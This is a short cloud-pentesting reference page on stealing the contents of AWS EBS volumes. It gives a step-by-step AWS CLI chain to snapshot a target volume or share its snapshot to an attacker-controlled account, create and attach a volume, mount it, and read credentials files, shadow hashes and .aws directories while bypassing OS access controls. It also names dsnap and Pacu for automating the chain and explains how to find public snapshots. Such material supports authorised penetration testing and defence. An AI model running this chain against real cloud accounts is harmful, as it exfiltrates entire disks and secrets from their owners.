---
title: "Snapshots: reading another instance's volumes offline"
description: "Creating, sharing, and mounting EBS snapshots to read another instance's volumes offline."
keywords:
  - EBS
  - snapshot
  - volume
  - share
  - data recovery
---

# Snapshots

An EBS **snapshot** is a copy of a volume, and with `ec2:CreateSnapshot` or access to an existing one you can mount it to an instance you control and read every file offline, bypassing the OS and its access controls. Snapshots are also shareable across accounts, so a snapshot with loose permissions leaks a whole disk.

## Snapshot, share, and mount

```bash
# Snapshot a target volume
aws ec2 create-snapshot --volume-id vol-xxxx --description x

# Or share an existing snapshot to an account you control
aws ec2 modify-snapshot-attribute --snapshot-id snap-xxxx \
  --attribute createVolumePermission --operation-type add --user-ids <your-acct>

# In your account/AZ: make a volume from it and attach to your instance
aws ec2 create-volume --snapshot-id snap-xxxx --availability-zone <az>
aws ec2 attach-volume --volume-id vol-yyyy --instance-id <your-instance> --device /dev/sdf
# then: mount /dev/xvdf1 /mnt and read
```

## Exploitation notes

- Finding secrets this way sidesteps running processes entirely: credentials files, shadow hashes, application config, and `.aws` directories are all readable from the mounted volume.
- `dsnap` and Pacu's EBS modules automate the snapshot, share, create-volume, attach, and mount chain.
- Public snapshots (shared with `all`) are discoverable across the region; check `describe-snapshots --restorable-by-user-ids all` scoped to an owner.

## Tools

- **AWS CLI** (`create-snapshot`, `modify-snapshot-attribute`, `create-volume`): the chain.
- **dsnap (RhinoSecurityLabs)**: download and mount EBS snapshots locally.
- **Pacu** (`ebs__explore_snapshots`): automate snapshot exploration.

## References

- [dsnap (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/dsnap)
- [HackTricks Cloud: EBS snapshots](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html)
